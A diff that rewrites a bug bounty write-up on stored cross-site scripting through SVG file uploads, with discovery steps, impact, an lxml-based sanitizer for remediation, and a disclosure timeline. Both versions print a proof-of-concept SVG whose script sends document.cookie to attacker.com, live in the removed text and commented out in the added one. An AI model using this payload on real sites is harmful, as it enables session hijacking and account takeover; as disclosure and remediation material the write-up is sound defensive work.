@@ -1,78 +1,91 @@
-# [01] Stored XSS via SVG Upload
+# Stored XSS via SVG File Upload
 
-**Target:** Private Bug Bounty Program  
-**Type:** Stored Cross-Site Scripting (XSS)  
 **Severity:** High  
-**Status:** Fixed ✅
-
----
+**CVSS:** 7.4  
+**Type:** Stored Cross-Site Scripting  
+**Target:** File upload functionality  
 
 ## Summary
 
-A file upload endpoint accepted SVG files without sanitizing their content.  
-By uploading a crafted SVG with embedded JavaScript, the payload executed in the context of any user who viewed the uploaded file.
+Discovered a stored XSS vulnerability in a web application that allowed SVG file uploads without proper sanitization. By embedding JavaScript inside an SVG file, an attacker could execute arbitrary scripts in the context of any user viewing the uploaded file.
 
----
+## Vulnerability Details
 
-## Discovery
+The application accepted `.svg` files in its document upload feature without:
+1. Validating SVG content for embedded scripts
+2. Sanitizing XML/SVG elements before storage/render
+3. Serving uploaded files with proper Content-Type headers
 
-While testing a file sharing feature, I noticed the app allowed SVG uploads and served them directly without converting to a safe format (e.g. PNG).
+## Proof of Concept
 
-Checked the Content-Type header on retrieval:
-```
-Content-Type: image/svg+xml
-```
+### Step 1: Create malicious SVG
 
-This means the browser renders the SVG as HTML — including any embedded script.
-
----
-
-## Exploitation
-
-**Payload (evil.svg):**
 ```xml
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
-    document.location="https://attacker.com/steal?c="+document.cookie;
+    alert(document.cookie);
+    // Or for session hijacking:
+    // fetch("https://attacker.com/steal?c="+document.cookie)
   </script>
 </svg>
 ```
 
-Steps:
-1. Upload  as a profile picture / attachment
-2. Copy the direct URL of the uploaded file
-3. Send the URL to any logged-in user
-4. When they open it, cookies are exfiltrated to attacker server
+### Step 2: Upload the file
 
-**Result:** Successfully stole session cookie of a test account. Full account takeover possible.
+Upload via the document upload endpoint (e.g., `/api/upload`).
 
----
+### Step 3: Trigger execution
+
+Navigate to the uploaded file URL — JavaScript executes in victim browser.
 
 ## Impact
 
-- Session hijacking for any user who views the file
+- Session hijacking via cookie theft
 - Account takeover
-- Potential for worm-like propagation in social features
-
----
+- Keylogging / credential theft
+- Stored persistence (affects all viewers)
 
 ## Remediation
 
-1. Convert all uploaded images to a safe raster format (PNG/JPEG) server-side
-2. If SVG must be preserved, sanitize with DOMPurify or equivalent
-3. Serve user-uploaded files from a separate domain (sandboxed origin)
-4. Set  to prevent inline rendering
+```python
+import bleach
+from lxml import etree
 
----
+def sanitize_svg(content: bytes) -> bytes:
+    """Strip scripts and event handlers from SVG"""
+    try:
+        tree = etree.fromstring(content)
+        # Remove all script tags
+        for elem in tree.iter("{http://www.w3.org/2000/svg}script"):
+            elem.getparent().remove(elem)
+        # Remove event handler attributes
+        for elem in tree.iter():
+            for attr in list(elem.attrib):
+                if attr.startswith("on"):
+                    del elem.attrib[attr]
+        return etree.tostring(tree)
+    except:
+        raise ValueError("Invalid SVG content")
+```
+
+- Serve uploaded SVGs as `Content-Type: text/plain` or use a sandbox iframe
+- Reject SVG uploads or use an allowlist of safe SVG elements
+- Implement Content Security Policy (CSP) headers
 
 ## Timeline
 
 | Date | Event |
 |------|-------|
-| Day 0 | Vulnerability discovered |
-| Day 1 | Report submitted via bug bounty platform |
-| Day 3 | Triaged as High |
-| Day 14 | Fix deployed |
-| Day 15 | Reward issued |
+| 2024-01-15 | Vulnerability discovered |
+| 2024-01-16 | Reported to vendor |
+| 2024-01-20 | Vendor acknowledged |
+| 2024-02-01 | Patch released |
+| 2024-02-05 | Public disclosure |
+
+## References
+
+- [OWASP SVG Security](https://owasp.org/www-community/vulnerabilities/xss)
+- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
